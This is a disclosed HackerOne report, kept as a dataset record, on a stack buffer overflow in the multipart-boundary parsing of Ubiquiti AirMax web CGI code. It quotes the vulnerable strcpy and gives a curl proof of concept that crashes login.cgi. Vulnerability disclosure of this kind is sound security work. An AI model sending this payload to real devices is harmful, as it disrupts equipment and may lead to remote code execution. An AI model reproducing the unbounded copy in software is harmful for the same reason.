---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '74004'
original_report_id: '74004'
title: Other Buffer Overflow in PHP of the AirMax Products
weakness: Memory Corruption - Generic
team_handle: ui
created_at: '2015-07-05T12:29:51.207Z'
disclosed_at: '2016-04-07T21:59:06.653Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 4
tags:
- hackerone
- memory-corruption-generic
---

# Other Buffer Overflow in PHP of the AirMax Products

## Metadata

- HackerOne Report ID: 74004
- Weakness: Memory Corruption - Generic
- Program: ui
- Disclosed At: 2016-04-07T21:59:06.653Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

tldr: Just like happen in Report [73491](https://hackerone.com/reports/73491), but **MUCH WORSE**.

#The Vulnerability
After the Report [73491](https://hackerone.com/reports/73491), I decided to take another look in the code on  files`post.c` and `uploadbuffer.c` (once I have nothing better to do than watch F1).

The problematic code:
```
char *getpost(void) {
/* Some Code */
	char *mb;
	char boundary[100];

/* Some Code */
	if(!strncasecmp(buf,"multipart/form-data",19)) {
		file_upload=1;
		mb = strchr(buf,'=');
		if(mb) strcpy(boundary,mb+1);	//!!The problematic Line!!
		else {
			Error("File Upload Error: No MIME boundary found"); 
			/* Some Code */
			return(NULL);
		}
	}
/* Rest of the Code */
}
```
Has you can see, it's copied the string in `mb+1` to `boundary` ( witch have a fixed size), so will cause a **Buffer Overflow** if the string in `mb` (here represent `boundary` camp in a POST request) it's bigger than 100 bytes. In a **Buffer Overflow** which happen in stack memory, do a remote code execution should be easy (Even more on a AirMax, once the equipment are almost identical).

#Reproduce
I will not create a exploit to this report, but unlike the Report [73491](https://hackerone.com/reports/73491), you just have to ask for one.

This Curl command will cause a buffer overflow.
```
curl -X POST -H "Content-Type: multipart/form-data; boundary=----------------------------dddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd" --data-binary AnyDataHERE "https://192.168.1.20/login.cgi" -k -v
```
Obs: Some times you need a bigger `boundary` (more `d`!!).

The lighttpd will return `(mod_cgi.c.1319) cleaning up CGI: process died with signal 11`.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
